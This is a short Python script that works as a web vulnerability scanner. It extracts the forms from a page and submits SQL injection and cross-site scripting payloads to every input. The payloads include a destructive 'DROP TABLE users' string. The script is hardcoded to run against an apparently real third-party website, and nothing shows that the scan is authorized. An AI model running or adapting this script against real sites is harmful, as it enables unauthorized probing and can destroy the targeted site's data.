import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

# Common payloads for testing vulnerabilities
SQLI_PAYLOADS = ["' OR '1'='1", "'; DROP TABLE users; --", "' OR 1=1 --"]
XSS_PAYLOADS = ["<script>alert('XSS')</script>", '"><img src=x onerror=alert(1)>']

def get_forms(url):
    """Extract all forms from the page"""
    soup = BeautifulSoup(requests.get(url).content, "html.parser")
    return soup.find_all("form")

def get_form_details(form):
    """Extract form details: action, method, inputs"""
    details = {}
    action = form.attrs.get("action", "")
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        name = input_tag.attrs.get("name")
        inputs.append({"type": input_type, "name": name})
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

def submit_form(form_details, url, value):
    """Submit form with a test payload"""
    target_url = urljoin(url, form_details["action"])
    data = {}
    for input in form_details["inputs"]:
        if input["name"]:
            data[input["name"]] = value
    if form_details["method"] == "post":
        return requests.post(target_url, data=data)
    return requests.get(target_url, params=data)

def scan_xss(url):
    """Scan the page for XSS vulnerabilities"""
    print("\n🔍 Scanning for XSS...")
    forms = get_forms(url)
    for form in forms:
        form_details = get_form_details(form)
        for payload in XSS_PAYLOADS:
            response = submit_form(form_details, url, payload)
            if payload in response.text:
                print(f"⚠️ Possible XSS vulnerability found in form: {form_details}")
                break

def scan_sqli(url):
    """Scan the page for SQL Injection vulnerabilities"""
    print("\n🔍 Scanning for SQL Injection...")
    forms = get_forms(url)
    for form in forms:
        form_details = get_form_details(form)
        for payload in SQLI_PAYLOADS:
            response = submit_form(form_details, url, payload)
            if "sql" in response.text.lower() or "mysql" in response.text.lower() or "syntax" in response.text.lower():
                print(f"⚠️ Possible SQL Injection found in form: {form_details}")
                break

if __name__ == "__main__":
    target_url = "http://mitsims.in/"
    scan_sqli(target_url)
    scan_xss(target_url)
